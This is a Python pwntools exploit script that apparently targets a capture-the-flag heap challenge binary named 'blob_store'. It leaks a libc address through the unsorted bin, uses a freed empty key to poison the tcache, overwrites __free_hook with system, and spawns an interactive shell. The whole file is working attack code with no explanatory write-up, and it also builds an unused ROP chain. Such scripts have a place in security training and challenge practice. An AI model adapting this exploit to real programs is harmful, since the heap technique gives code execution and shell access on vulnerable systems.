#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template /var/challenges/blob_store/blob_store
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or '/var/challenges/blob_store/blob_store')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:      Full RELRO
# Stack:      Canary found
# NX:         NX enabled
# PIE:        PIE enabled
# FORTIFY:    Enabled
# SHSTK:      Enabled
# IBT:        Enabled
# Stripped:   No
# Debuginfo:  Yes

io = start()

def allocate(key, char, len):
    io.sendline("2") # add key
    io.sendline(key) # key
    io.sendline(str(len)) # value length
    io.sendline((len - 1) * char) # value # -1 to leave room for newline char

def deallocate(key):
    io.sendline("5") # remove key
    io.sendline(key) # key
    
def read(key):
    io.sendline("3") # read key
    io.sendline(key) # key
    
def update(key, value):
    io.sendline("4") # update key
    io.sendline(key)
    io.sendline(value) 

# Get something in the unsorted bin
allocate("a", b"A", 4048)
allocate("b", b"B", 4048)
allocate("c", b"C", 4048)
deallocate("b")

read("")

data = io.recvuntil(b"BBBB")
ptrs = data.split(b"\n")[-1][:-4] # discard "BBBB"
print("Received:", ptrs)
print("Len: ", len(ptrs))

# Split the pointers in chunks of 8 bytes
ptrs = [ptrs[i:i+8] for i in range(0, len(ptrs), 8)]
    
# The first pointer points to main_arena+96, so calculate base address of libc with it
main_arena = int.from_bytes(ptrs[0], "little")
libc_base = main_arena - 96 - 0x1ecb80 # from GDB info proc mappings, fixed offset
print("Libc base:", hex(libc_base))

libc.address = libc_base
rop = ROP(libc)
rop.system(next(libc.search(b"/bin/sh\x00")))
print(rop.dump())

# Give the memory back to the system to reuse the empty key "" 
allocate("b", b"B", 4048)

# Find _free_hook
free_hook = libc.symbols['__free_hook']
print("Free hook:", hex(free_hook))

# Set up tcache 
allocate("d", b"D", 32)
allocate("e", b"E", 32)
allocate("f", b"F", 32)
deallocate("e")
deallocate("d")

# Set the value of "e" (now no key) to the address of free_hook
update("", p64(free_hook) + b"X" * (24 -1)) # -1 to leave room for newline char

allocate("y", b"Y", 32)
allocate("z", b"Z", 32) # z should now point to free_hook
update("z", p64(libc.symbols['system']) + b"X" * (24 - 1)) # -1 to leave room for newline char

update("y", b"/bin/sh\x00" + (24 - 1) * b"X") # update y to /bin/sh
deallocate("y") # trigger system("/bin/sh")

io.interactive()

